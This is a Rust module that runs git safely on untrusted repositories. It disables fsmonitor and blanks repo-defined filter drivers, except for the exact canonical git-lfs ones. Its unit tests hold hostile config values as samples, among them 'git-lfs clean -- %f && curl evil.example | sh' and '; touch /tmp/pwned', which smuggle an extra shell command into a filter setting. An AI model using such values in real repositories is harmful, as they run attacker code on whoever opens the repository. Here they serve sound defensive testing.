use std::{
    ffi::OsString,
    io::Write,
    os::unix::ffi::OsStringExt,
    path::Path,
    process::{Command, Stdio},
};

use crate::Error;

/// Runs `git` in `dir` and returns stdout. Exit code 0 is success.
///
/// Never prompts for input, and never takes the index lock, so a background
/// refresh cannot make the user's own `git commit` fail.
///
/// A repository's own config is untrusted: opening a directory that came with its
/// `.git` must not run code it chose. Two defences apply to every call:
/// - `core.fsmonitor` is forced off, because it names a command `git status` runs.
/// - Filter drivers (`filter.<name>.clean/smudge/process`) defined in the repo's own
///   config are blanked, because git runs them whenever it compares or stages a
///   file. Filters from the user's global or system config are left alone, as are
///   `git-lfs` ones, so legitimate setups keep working.
///
/// Diff callers also pass `--no-ext-diff` and `--no-textconv`. Hooks are left alone so
/// they still run for commits, as they would in a terminal.
pub(crate) fn run_git(dir: &Path, args: &[&str]) -> Result<Vec<u8>, Error> {
    run_git_allowing(dir, args, &[0])
}

/// Like `run_git`, but also treats the listed exit codes as success. `git diff
/// --no-index` exits 1 when the files differ, which is the normal case.
pub(crate) fn run_git_allowing(
    dir: &Path,
    args: &[&str],
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    run(dir, args, None, success_codes)
}

/// Runs `git` with `input` on stdin, e.g. `git commit -F -` so a message never
/// touches the command line or a temp file.
pub(crate) fn run_git_with_input(
    dir: &Path,
    args: &[&str],
    input: &[u8],
) -> Result<Vec<u8>, Error> {
    run(dir, args, Some(input), &[0])
}

/// A config key and the value to force it to, passed to git as `GIT_CONFIG_KEY_n` /
/// `GIT_CONFIG_VALUE_n`. Unlike `-c key=value`, the key is taken as-is: no `=` splitting,
/// and no requirement that it be valid UTF-8.
type ConfigOverride = (OsString, OsString);

fn run(
    dir: &Path,
    args: &[&str],
    input: Option<&[u8]>,
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    // Fail closed: if we can't tell which filters the repo configured, run nothing.
    let overrides = untrusted_filter_overrides(dir)?;
    exec(dir, &overrides, args, input, success_codes)
}

/// Overrides that disable filters the repo configured.
fn untrusted_filter_overrides(dir: &Path) -> Result<Vec<ConfigOverride>, Error> {
    // Reading config runs nothing, so this call itself needs no overrides. Exit code 1
    // just means nothing matched. `lfs.*` is read too, because git-lfs runs commands
    // named by some of its own settings.
    let output = exec(
        dir,
        &[],
        &[
            "config",
            "-z",
            "--show-scope",
            "--get-regexp",
            r"^(filter|lfs)\.",
        ],
        None,
        &[0, 1],
    )?;
    Ok(blank_untrusted_filters(&output))
}

/// Parses `git config -z --show-scope --get-regexp` output, a series of
/// `scope NUL key NEWLINE value NUL` records. It works on bytes throughout: decoding
/// a key lossily would make the override name a different key than the real one.
/// A value may contain newlines, so it can't be mistaken for another entry.
fn blank_untrusted_filters(config: &[u8]) -> Vec<ConfigOverride> {
    let mut entries = Vec::new();
    let mut fields = config.split(|byte| *byte == 0);
    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
        if matches!(scope, b"local" | b"worktree") {
            let (key, value) = match entry.iter().position(|byte| *byte == b'\n') {
                Some(at) => (&entry[..at], &entry[at + 1..]),
                None => (entry, &entry[entry.len()..]),
            };
            entries.push((key, value));
        }
    }

    // git-lfs runs commands named by some of its own settings, so its filters are only
    // trusted while every `lfs.*` key the repo sets is known to be inert. Anything
    // unrecognised withdraws trust: new git-lfs settings can't quietly become a hole.
    let lfs_has_unknown_settings = entries.iter().any(|(key, _)| {
        key.len() >= 4 && key[..4].eq_ignore_ascii_case(b"lfs.") && !is_inert_lfs_setting(key)
    });

    let mut overrides = Vec::new();
    for (key, value) in entries {
        let Some((driver, command)) = key.strip_prefix(b"filter.").and_then(|rest| {
            rest.iter()
                .rposition(|byte| *byte == b'.')
                .map(|at| (&rest[..at], &rest[at + 1..]))
        }) else {
            continue;
        };
        if !matches!(command, b"clean" | b"smudge" | b"process")
            || (!lfs_has_unknown_settings && is_canonical_lfs(driver, command, value))
        {
            continue;
        }
        overrides.push((OsString::from_vec(key.to_vec()), OsString::new()));
    }
    overrides
}

/// `lfs.*` settings that only name data, never a command. Git folds the case of the
/// section and variable name but not of the middle part, so compare case-insensitively.
fn is_inert_lfs_setting(key: &[u8]) -> bool {
    let key = key.to_ascii_lowercase();
    matches!(
        key.as_slice(),
        b"lfs.url"
            | b"lfs.pushurl"
            | b"lfs.repositoryformatversion"
            | b"lfs.locksverify"
            | b"lfs.concurrenttransfers"
            | b"lfs.fetchinclude"
            | b"lfs.fetchexclude"
    )
    // Per-remote settings are `lfs.<url>.locksverify` / `.access`.
        || (key.starts_with(b"lfs.")
            && !key.starts_with(b"lfs.extension.")
            && !key.starts_with(b"lfs.customtransfer.")
            && (key.ends_with(b".locksverify") || key.ends_with(b".access")))
}

/// Git LFS is the one common filter installed per repository, and blanking it would
/// make every large file look modified. Only the driver named `lfs` with exactly the
/// values `git lfs install` writes is trusted: git runs these strings through a shell,
/// so anything looser (a prefix match, extra arguments) could smuggle in a command.
fn is_canonical_lfs(driver: &[u8], command: &[u8], value: &[u8]) -> bool {
    driver == b"lfs"
        && matches!(
            (command, value),
            (b"clean", b"git-lfs clean -- %f")
                | (b"smudge", b"git-lfs smudge -- %f")
                | (b"smudge", b"git-lfs smudge --skip -- %f")
                | (b"process", b"git-lfs filter-process")
                | (b"process", b"git-lfs filter-process --skip")
        )
}

/// Adds `overrides` after any `GIT_CONFIG_COUNT` entries the user's environment already has.
fn apply_overrides(command: &mut Command, overrides: &[ConfigOverride]) {
    let existing: usize = std::env::var("GIT_CONFIG_COUNT")
        .ok()
        .and_then(|count| count.parse().ok())
        .unwrap_or(0);
    for (offset, (key, value)) in overrides.iter().enumerate() {
        let n = existing + offset;
        command.env(format!("GIT_CONFIG_KEY_{n}"), key);
        command.env(format!("GIT_CONFIG_VALUE_{n}"), value);
    }
    if !overrides.is_empty() {
        command.env("GIT_CONFIG_COUNT", (existing + overrides.len()).to_string());
    }
}

fn exec(
    dir: &Path,
    overrides: &[ConfigOverride],
    args: &[&str],
    input: Option<&[u8]>,
    success_codes: &[i32],
) -> Result<Vec<u8>, Error> {
    let mut command = Command::new("git");
    command
        .arg("-C")
        .arg(dir)
        .args(["-c", "core.fsmonitor=false"])
        .args(args)
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_OPTIONAL_LOCKS", "0")
        // A file named `a[1].txt` must mean that file, not a glob.
        .env("GIT_LITERAL_PATHSPECS", "1");
    apply_overrides(&mut command, overrides);
    let mut child = command
        .stdin(if input.is_some() {
            Stdio::piped()
        } else {
            Stdio::null()
        })
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    if let (Some(input), Some(mut stdin)) = (input, child.stdin.take()) {
        // Dropping `stdin` at the end of the block closes the pipe so git sees EOF.
        stdin.write_all(input)?;
    }
    let output = child.wait_with_output()?;

    if output
        .status
        .code()
        .is_some_and(|code| success_codes.contains(&code))
    {
        Ok(output.stdout)
    } else {
        Err(Error::Git {
            command: args.first().copied().unwrap_or_default().to_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).trim().to_owned(),
        })
    }
}

#[cfg(test)]
mod tests {
    use std::os::unix::ffi::OsStrExt;

    use super::*;

    /// Builds `git config -z --show-scope` output.
    fn config(entries: &[(&str, &[u8], &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        for (scope, key, value) in entries {
            out.extend_from_slice(scope.as_bytes());
            out.push(0);
            out.extend_from_slice(key);
            out.push(b'\n');
            out.extend_from_slice(value);
            out.push(0);
        }
        out
    }

    fn keys(overrides: &[ConfigOverride]) -> Vec<Vec<u8>> {
        overrides
            .iter()
            .map(|(key, value)| {
                assert!(value.is_empty(), "overrides must blank the value");
                key.as_bytes().to_vec()
            })
            .collect()
    }

    #[test]
    fn blanks_repo_scoped_filters_only() {
        let output = config(&[
            ("local", b"filter.evil.clean", b"/tmp/evil.sh"),
            ("global", b"filter.mine.clean", b"my-clean"),
            ("worktree", b"filter.wt.smudge", b"/tmp/wt.sh"),
            ("system", b"filter.sys.process", b"sys-filter"),
        ]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.evil.clean".to_vec(), b"filter.wt.smudge".to_vec()]
        );
    }

    #[test]
    fn keeps_exactly_the_canonical_lfs_filters() {
        let output = config(&[
            ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
            ("local", b"filter.lfs.smudge", b"git-lfs smudge -- %f"),
            ("local", b"filter.lfs.process", b"git-lfs filter-process"),
            ("local", b"filter.lfs.required", b"true"),
        ]);
        assert!(blank_untrusted_filters(&output).is_empty());
    }

    #[test]
    fn an_lfs_lookalike_that_adds_a_command_is_blanked() {
        // Git runs these through a shell, so a trailing `; ...` would execute.
        for value in [
            &b"git-lfs clean -- %f; touch /tmp/pwned"[..],
            b"git-lfs clean -- %f && curl evil.example | sh",
            b"git-lfs clean -- %f\ntouch /tmp/pwned",
            b"git-lfs clean -- %f ",
            b"git-lfs clean",
            b"git-lfs-evil clean -- %f",
        ] {
            let output = config(&[("local", b"filter.lfs.clean", value)]);
            assert_eq!(
                keys(&blank_untrusted_filters(&output)),
                [b"filter.lfs.clean".to_vec()],
                "{value:?} was trusted"
            );
        }
    }

    #[test]
    fn the_lfs_command_is_only_trusted_on_the_driver_named_lfs() {
        let output = config(&[("local", b"filter.other.clean", b"git-lfs clean -- %f")]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.other.clean".to_vec()]
        );
    }

    #[test]
    fn lfs_is_not_trusted_while_the_repo_configures_commands_for_it() {
        // git-lfs itself runs the commands these name, so its filters can't be exempt.
        for risky in [
            &b"lfs.extension.mine.clean"[..],
            b"lfs.customtransfer.mine.path",
            b"lfs.standalonetransferagent",
        ] {
            let output = config(&[
                ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
                ("local", risky, b"/tmp/evil.sh"),
            ]);
            assert_eq!(
                keys(&blank_untrusted_filters(&output)),
                [b"filter.lfs.clean".to_vec()],
                "{:?} did not withdraw trust",
                String::from_utf8_lossy(risky)
            );
        }
    }

    #[test]
    fn the_case_of_an_lfs_key_cannot_hide_a_risky_setting() {
        // Git keeps the case of a key's middle part, so these are distinct spellings.
        for risky in [
            &b"lfs.Extension.mine.clean"[..],
            b"LFS.extension.mine.clean",
            b"lfs.CUSTOMTRANSFER.mine.path",
            b"lfs.StandaloneTransferAgent",
        ] {
            let output = config(&[
                ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
                ("local", risky, b"/tmp/evil.sh"),
            ]);
            assert_eq!(
                keys(&blank_untrusted_filters(&output)),
                [b"filter.lfs.clean".to_vec()],
                "{:?} did not withdraw trust",
                String::from_utf8_lossy(risky)
            );
        }
    }

    #[test]
    fn an_unrecognised_lfs_setting_withdraws_trust() {
        let output = config(&[
            ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
            ("local", b"lfs.somethingnew", b"x"),
        ]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.lfs.clean".to_vec()]
        );
    }

    #[test]
    fn ordinary_lfs_settings_keep_trust() {
        let output = config(&[
            ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
            ("local", b"lfs.repositoryformatversion", b"0"),
            (
                "local",
                b"lfs.url",
                b"https://example.com/repo.git/info/lfs",
            ),
            (
                "local",
                b"lfs.https://example.com/repo.git/info/lfs.locksverify",
                b"true",
            ),
        ]);
        assert!(blank_untrusted_filters(&output).is_empty());
    }

    #[test]
    fn global_lfs_settings_do_not_withdraw_trust() {
        let output = config(&[
            ("local", b"filter.lfs.clean", b"git-lfs clean -- %f"),
            ("global", b"lfs.extension.mine.clean", b"my-extension"),
        ]);
        assert!(blank_untrusted_filters(&output).is_empty());
    }

    #[test]
    fn driver_names_with_equals_signs_or_invalid_utf8_are_blanked_byte_for_byte() {
        // `-c key=value` would split the first name at `=`, and a lossy decode would
        // turn the second into a different key. The override must name the exact bytes.
        let equals = b"filter.a=b.clean".to_vec();
        let invalid_utf8 = b"filter.bad\xff\xfename.smudge".to_vec();
        let output = config(&[
            ("local", &equals, b"run-me"),
            ("local", &invalid_utf8, b"run-me"),
        ]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [equals, invalid_utf8]
        );
    }

    #[test]
    fn a_value_cannot_forge_another_entry() {
        // The multi-line value contains text that looks like a global (trusted) entry.
        let output = config(&[(
            "local",
            b"filter.evil.clean",
            b"x\nglobal\0filter.evil.clean\nsafe",
        )]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.evil.clean".to_vec()]
        );
    }

    #[test]
    fn only_clean_smudge_and_process_are_blanked() {
        let output = config(&[
            ("local", b"filter.x.required", b"true"),
            ("local", b"filter.x.clean", b"run-me"),
        ]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.x.clean".to_vec()]
        );
    }

    #[test]
    fn driver_names_containing_dots_are_handled() {
        let output = config(&[("local", b"filter.my.driver.clean", b"run-me")]);
        assert_eq!(
            keys(&blank_untrusted_filters(&output)),
            [b"filter.my.driver.clean".to_vec()]
        );
    }

    #[test]
    fn empty_and_malformed_output_blanks_nothing() {
        assert!(blank_untrusted_filters(b"").is_empty());
        assert!(blank_untrusted_filters(b"local").is_empty());
        assert!(blank_untrusted_filters(b"local\0not-a-filter\nx\0").is_empty());
    }
}
